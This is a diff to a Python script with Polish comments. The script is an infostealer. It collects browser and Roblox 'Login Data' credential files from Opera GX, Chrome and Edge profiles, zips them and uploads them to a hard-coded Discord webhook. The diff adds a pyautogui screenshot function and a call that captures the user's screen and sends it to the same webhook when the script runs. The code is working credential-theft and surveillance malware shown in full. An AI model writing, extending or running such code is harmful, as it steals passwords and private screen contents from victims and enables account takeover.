@@ -2,8 +2,8 @@ import os
 import shutil
 import zipfile
 import requests
-import sys  # Dodany import sys
-
+import sys
+import pyautogui  # Dodane importowanie pyautogui
 
 # URL webhooków (możesz dostosować je w zależności od użytkownika)
 webhook_url_1 = "https://discord.com/api/webhooks/1322292531374854224/Fdl-C9RgDUxDtK2bFQXPpRx5G_jGHjy2cNJ-k7_4O4kUAIfJaIZLOTz2JUSLon5QBOGe"
@@ -40,7 +40,7 @@ login_data_paths = {
     "Opera GX": r"AppData\Roaming\Opera Software\Opera GX Stable\Login Data",
     "Google Chrome": r"AppData\Local\Google\Chrome\User Data\Default\Login Data",
     "Microsoft Edge": r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
-    "Roblox": r"AppData\Local\Roblox\user_data\Login Data"  # Dodana ścieżka dla Roblox
+    "Roblox": r"AppData\Local\Roblox\user_data\Login Data"
 }
 
 # Funkcja do tworzenia pliku ZIP
@@ -49,6 +49,17 @@ def create_zip_from_files(file_paths, zip_file_name):
         for file in file_paths:
             zipf.write(file, os.path.basename(file))
     print(f"Pliki spakowane do {zip_file_name}")
+
+# Funkcja do robienia zrzutu ekranu
+def take_screenshot(save_path):
+    try:
+        screenshot = pyautogui.screenshot()
+        screenshot.save(save_path)
+        print(f"Zrzut ekranu zapisany w {save_path}")
+        return save_path
+    except Exception as e:
+        print(f"Błąd przy robieniu zrzutu ekranu: {e}")
+        return None
 
 # Funkcja do przeszukiwania folderów użytkowników i zbierania plików Login Data
 def search_for_login_data():
@@ -91,5 +102,17 @@ def search_for_login_data():
         else:
             print("Brak plików do spakowania i wysłania.")
 
+# Funkcja do robienia zrzutu ekranu i wysyłania na Discord
+def send_screenshot_to_discord():
+    screenshot_path = r"C:\Users\grzes\Desktop\screenshot.png"
+    screenshot_file = take_screenshot(screenshot_path)
+    
+    if screenshot_file:
+        send_file_to_discord(screenshot_file, webhook_url_1)
+        print(f"Zrzut ekranu wysłany na Discord.")
+
 # Uruchomienie przeszukiwania
 search_for_login_data()
+
+# Uruchomienie robienia zrzutu ekranu i wysyłania go na Discord
+send_screenshot_to_discord()
